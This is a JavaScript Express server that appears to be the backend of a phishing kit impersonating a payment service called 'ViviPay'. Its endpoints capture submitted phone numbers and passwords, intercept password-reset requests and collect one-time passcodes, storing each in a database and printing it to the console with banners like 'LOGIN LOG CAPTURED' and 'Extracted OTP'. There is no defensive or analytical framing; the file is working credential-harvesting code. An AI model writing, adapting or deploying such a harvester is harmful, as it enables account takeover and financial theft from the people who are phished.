const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
const PORT = process.env.PORT || 4000;

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Database configuration model schema
const UserSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otp: { type: String, required: false },
    resetPhone: { type: String, required: false },
    newPassword: { type: String, required: false },
    actionType: { type: String, default: 'LOGIN' }, 
    timestamp: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);
let pendingResets = {};

async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        await mongoose.connect(mongoUri);
        
        console.log(`\n==================================================`);
        console.log(`🎉 ViviPay Database Core Engine Connected!`);
        console.log(`==================================================`);

        app.listen(PORT, () => {
            console.log(`🚀 Server monitoring inbound pipeline on port: ${PORT}`);
            console.log(`==================================================\n`);
        });
    } catch (error) {
        console.error("❌ DB Engine failure:", error);
    }
}

// 1. LOGIN SUITE
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: 'LOGIN' });
        await newUser.save();

        console.log(`[⚡ LOGIN LOG CAPTURED]`);
        console.log(`📱 Phone: ${phoneNumber}`);
        console.log(`🔑 Pass : ${password}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true, userId: newUser._id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. FORGOT PASSWORD INTERCEPT
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        pendingResets[phone] = { newPassword };

        console.log(`[🔄 PASSWORD MODIFY DETECTED]`);
        console.log(`📱 Account: ${phone}`);
        console.log(`--------------------------------------------------`);

        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. OTP PIPELINE AGGREGATOR
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp, isReset, phone } = req.body;

        if (isReset) {
            const contextData = pendingResets[phone];
            if (contextData) {
                const record = new User({
                    resetPhone: phone,
                    newPassword: contextData.newPassword,
                    otp: otp,
                    actionType: 'PASSWORD_RESET'
                });
                await record.save();

                console.log(`[🔐 CONTEXT COMPLETE: PASSWORD MODIFIED WITH OTP]`);
                console.log(`📱 User account: ${phone}`);
                console.log(`🔥 Extracted OTP: ${otp}`);
                console.log(`🔑 New Logged PWD: ${contextData.newPassword}`);
                console.log(`==================================================\n`);
                
                delete pendingResets[phone];
                return res.status(200).json({ success: true });
            } else {
                return res.status(400).json({ success: false, message: "Pipeline Context Mismatch" });
            }
        } else {
            if (mongoose.Types.ObjectId.isValid(userId)) {
                await User.findByIdAndUpdate(userId, { otp: otp });
            }
            console.log(`[🔐 CONTEXT COMPLETE: LOGIN OTP EXTRACTED]`);
            console.log(`🔥 OTP Input Code: ${otp}`);
            console.log(`==================================================\n`);
            return res.status(200).json({ success: true });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

startServer();
